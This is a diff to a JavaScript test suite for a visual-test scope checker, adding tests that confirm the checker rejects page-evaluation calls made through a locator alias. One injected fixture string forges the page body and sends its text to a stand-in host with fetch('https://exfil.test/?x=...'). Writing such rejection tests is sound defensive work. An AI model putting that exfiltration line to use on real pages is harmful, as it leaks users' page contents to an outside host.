@@ -45,6 +45,8 @@ function visualSpec(
     wrongRouteFor,
     wrongQueryFor,
     additionalNavigationFor,
+    additionalVisualOperationFor,
+    additionalVisualOperationCode,
     helperNavigationFor,
     nestedNavigationFor,
     screenshotBeforeNavigationFor,
@@ -98,6 +100,11 @@ function visualSpec(
                     : `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 0 });`;
       const additionalNavigation =
         testName === additionalNavigationFor ? "await page.goto(target);" : "";
+      const additionalVisualOperation =
+        testName === additionalVisualOperationFor
+          ? (additionalVisualOperationCode ??
+            "const root = page.locator(\"#storybook-root\"); await root.evaluateHandle(\"() => { document.body.innerHTML = '<main>forged</main>'; fetch('https://exfil.test/?x=' + document.body.innerText); }\");")
+          : "";
       const targetDeclaration =
         testName === additionalNavigationFor
           ? 'const target = "/agent/inbox";'
@@ -156,7 +163,7 @@ function visualSpec(
         testName === disabledFor
           ? 'if (process.env.CI) test.fixme(true, "known issue");'
           : ""
-      } ${testName === computedSkipFor ? 'test["skip"](true, "temporarily disabled");' : ""} ${targetDeclaration} ${documentIntercept} ${setContentInApiRoute} ${computedTaggedSetContentInApiRoute} ${shadowedFixtureHelper} await installAuthenticatedFixture(page); ${shadowedPageBinding} ${beforeNavigation}await page.goto(${JSON.stringify(navigation)}); ${earlyReturn} ${setContent} ${additionalNavigation} ${nestedNavigation} ${helperNavigation} ${mutationInVisibility} ${testName === mutationInVisibilityFor ? "" : 'await expect(page.getByText("screen ready")).toBeVisible();'} ${shadowedSettleHelper} ${useShadowedSettleHelper} ${afterNavigation} });`;
+      } ${testName === computedSkipFor ? 'test["skip"](true, "temporarily disabled");' : ""} ${targetDeclaration} ${documentIntercept} ${setContentInApiRoute} ${computedTaggedSetContentInApiRoute} ${shadowedFixtureHelper} await installAuthenticatedFixture(page); ${shadowedPageBinding} ${beforeNavigation}await page.goto(${JSON.stringify(navigation)}); ${earlyReturn} ${setContent} ${additionalNavigation} ${additionalVisualOperation} ${nestedNavigation} ${helperNavigation} ${mutationInVisibility} ${testName === mutationInVisibilityFor ? "" : 'await expect(page.getByText("screen ready")).toBeVisible();'} ${shadowedSettleHelper} ${useShadowedSettleHelper} ${afterNavigation} });`;
     })
     .join("\n");
   const testImport = fakeTestBinding
@@ -422,6 +429,32 @@ test("G8 rejects opaque browser execution and string-based code executors", asyn
     assert.notEqual(result.status, 0, runtimeCode);
     assert.match(result.output, /network capability/, runtimeCode);
   }
+});
+
+test("G8 rejects evaluateHandle through an allowed page locator alias", async () => {
+  const result = await runVisualScope({
+    routes: ACTIVE_ROUTES,
+    source: visualSpec(SCREENS, {
+      additionalVisualOperationFor: "work list @visual",
+    }),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /navigation|network capability/i);
+});
+
+test("G8 rejects evaluateAll through an allowed page locator alias", async () => {
+  const result = await runVisualScope({
+    routes: ACTIVE_ROUTES,
+    source: visualSpec(SCREENS, {
+      additionalVisualOperationFor: "work list @visual",
+      additionalVisualOperationCode:
+        'const root = page.locator("#storybook-root"); await root.evaluateAll((nodes) => nodes.length);',
+    }),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /network capability/i);
 });
 
 test("G8 rejects string source passed to the approved Storybook page evaluation", async () => {
